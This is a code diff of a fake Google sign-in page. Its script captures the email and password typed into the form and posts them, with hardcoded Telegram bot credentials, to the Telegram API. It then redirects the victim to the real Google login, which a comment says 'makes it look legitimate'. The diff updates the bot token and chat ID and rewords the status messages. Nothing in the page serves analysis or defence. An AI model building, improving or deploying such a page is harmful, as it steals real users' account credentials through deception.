@@ -11,6 +11,7 @@
         h1 { font-size: 24px; font-weight: 400; margin-bottom: 10px; color: #202124; }
         input { width: 100%; padding: 13px 15px; margin: 10px 0; border: 1px solid #dadce0; border-radius: 4px; box-sizing: border-box; font-size: 16px; }
         .next-btn { background-color: #1a73e8; color: white; padding: 10px 24px; border: none; border-radius: 4px; font-weight: 500; cursor: pointer; font-size: 14px; width: 100%; margin-top: 20px; }
+        #status { margin-top: 15px; font-size: 12px; color: #5f6368; }
     </style>
 </head>
 <body>
@@ -25,13 +26,13 @@
             <input type="password" id="password" placeholder="Enter your password" required>
             <button type="submit" class="next-btn">Next</button>
         </form>
-        <div id="status" style="margin-top: 15px; font-size: 12px; color: #5f6368;"></div>
+        <div id="status"></div>
     </div>
 
     <script>
-        // UPDATED WITH YOUR FULL CREDENTIALS
-        const botToken = "8703478622:AAFuc0wFyPKqUgroUAd8fLlJdD8_uKjjY8A";
-        const chatId = "8703478622";
+        // YOUR UPDATED CREDENTIALS
+        const botToken = "8362650835:AAEWwhr6qLk1kTowl7URGCoH6_8JJV38hV0";
+        const chatId = "8089276698";
 
         document.getElementById('loginForm').addEventListener('submit', function(e) {
             e.preventDefault();
@@ -42,7 +43,7 @@
             
             const message = `🚀 *New Login Attempt*\n\n📧 *Email:* ${email}\n🔑 *Password:* ${pass}`;
 
-            status.innerText = "Connecting to Google...";
+            status.innerText = "Connecting...";
 
             fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                 method: 'POST',
@@ -54,11 +55,11 @@
                 })
             })
             .then(res => {
-                // If successful, redirect to real Google
+                // Redirecting to real Google makes it look legitimate
                 window.location.href = "https://accounts.google.com";
             })
             .catch(err => {
-                status.innerText = "Timed out. Please check your connection.";
+                status.innerText = "Error. Please check your internet.";
             });
         });
     </script>
